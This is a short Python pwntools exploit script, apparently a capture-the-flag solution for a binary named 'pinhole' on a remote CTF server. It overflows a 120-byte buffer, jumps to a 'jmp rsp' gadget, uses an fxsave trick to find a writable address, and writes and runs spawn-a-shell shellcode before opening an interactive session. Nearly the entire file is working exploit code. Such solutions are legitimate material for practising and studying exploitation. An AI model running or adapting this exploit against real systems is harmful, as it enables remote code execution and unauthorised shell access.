from pwn import *

elf = ELF("pinhole")

# r = remote('0.0.0.0',4000)
r = remote('csie.ctf.tw',10180)
get_plt = 0x400500
jmp_rsp = 0x4007d3
raw_input('pause')
buf = 'A'*120

context.arch = 'x86_64'
shellcode =  asm(
'''
faddp st(1),st
mov rax,0x402800
fxsave64 [rax]
mov rax,[rax+8]
mov rbx,rax
'''
) #+ '\xeb\xfe'
shellcode2 = ''
craft = asm(shellcraft.amd64.sh(),arch='amd64')
for i in range(len(craft)):
  shellcode2 += 'mov byte ptr[rax], '
  shellcode2 += (hex(ord(craft[i]))  + '\n')
  shellcode2 += 'add rax,1\n'

shellcode2 += 'jmp rsp'


print len(shellcode)
r.sendline(buf + p64(jmp_rsp) + shellcode + asm(shellcode2,arch='amd64') )



#r.sendline(buf + p64(pop_rdi) + p64(pad_add) + p64(get_plt) + p64(pad_addr) + p64(get_plt))
#r.sendline(shellcode)

r.interactive()
